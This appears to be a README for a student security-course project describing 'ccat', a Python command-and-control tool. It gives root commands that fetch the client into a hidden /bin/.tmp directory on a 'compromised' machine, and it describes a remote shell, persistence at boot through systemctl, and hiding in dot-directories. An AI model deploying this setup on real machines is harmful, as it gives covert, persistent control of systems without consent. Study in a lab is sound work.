# C2 Project Submission
## Installation
First, install pip using the instructions [here](https://pip.pypa.io/en/stable/installation/#get-pip-py).

Install the pycryptodome package using pip and download the relevant repo code.
On the client (compromised week 4) machine, run the following as root:

```shell
pip install pycryptodome
cd /bin && mkdir .tmp && cd .tmp
curl -L https://github.com/tararoshan/ccat/raw/main/python-version/configuration.py -o configuration.py
curl -L https://github.com/tararoshan/ccat/raw/main/python-version/client.py -o client.py
```

And likewise, run the following on the attacking machine:
```shell
pip install pycryptodome
curl -L https://github.com/tararoshan/ccat/raw/main/python-version/configuration.py -o configuration.py
curl -L https://github.com/tararoshan/ccat/raw/main/python-version/server.py -o server.py
```

## Testing
To test that ccat works, run the server from the command machine (`python server.py`)
and then run the client process (`python client.py`) on the compromised machine,
or just reboot it after the installation process. To change configuration
options like your IP address, see the first two lines of `configuration.py` and
make sure you change this in both the *client and server* copies! :)

One way of figuring out the server's IP is by running `curl https://ipinfo.io/ip`
from the attacking (server) machine (unless you're just running it as the hostOS,
which is normally 10.0.0.2 for VirtualBox).

One thing to note is that if you want to run a process in another directory, you
need to run *cd /absolute/path/name && process_name*. That is, you can't change
the current working directory of the shell (because each one is run as another
process).[^1]

[^1]: So you can technically change the working directory, but it'll be the
working directory of the currently running process. So the next command you run
won't be affected. If I had more time, I could flesh this out using the os.cwd()
function.

## Requirement Completion
### Remote shell access to host
ccat uses the `subprocess` python library with the `shell=True` to run commands
sent from the server as shell commands.

### Persist across reboots
ccat is safed to disk, so it'll remain after reboots. It's added to `systmctl`
to run during startup, as well. So it'll run after the system boots up again.

### Configuration for where to get commands
See configuration.py.

### Authenticate communication
Using the pycryptodome library, I used RSA (asymmetric) encryption to encrypt
communication between the server and client. If there were more clients, I'd
make a file like
```json
{
    "0.0.0.3": "password1",
    "0.0.0.4": "password2",
    "0.0.0.5": "password3",
    "0.0.0.6": "password4"
}
```
for the server to know which password to send to each client. Each client would
have a hardcoded password to look for to grant access to the server.

### Attempt to hide itself
By saving the code in a directory starting with ".", users won't see the
directory in a GUI or with `ls` (unless they run it with the `-a` flag).

I initially tried to do this with process injection (you can look at my GitHub
commits for proof), but I found that using Cython to get a C version of the
python code and then trying to link it myself was too difficult. I was so close,
if not for that darned .so shared object file. :(

## Detecting ccat
```shell
ps | grep "ccat"
```
If this prints something, ccat is running! If not, you're safe.

Some other ideas include
1. Looking at network traffic with Wireshark
2. Recursively searching the entire filesystem for ccat (via `find -R ccat` or something)

## Resources & Credit
I used [this](https://medium.com/@songchai.d01/how-to-create-a-reverse-shell-in-python-41fe75d88521)
Medium article to learn how to use the sockets, subprocess, and sys python libraries for building a
reverse shell. I found similar resources [here](https://medium.com/geekculture/breaking-down-a-python-reverse-shell-one-liner-752041733e5f)
and [here](https://stackoverflow.com/questions/28411960/execute-a-command-on-remote-machine-in-python/28413657#28413657),
as well as the [official docs](https://docs.python.org/2.6/library/socket.html).
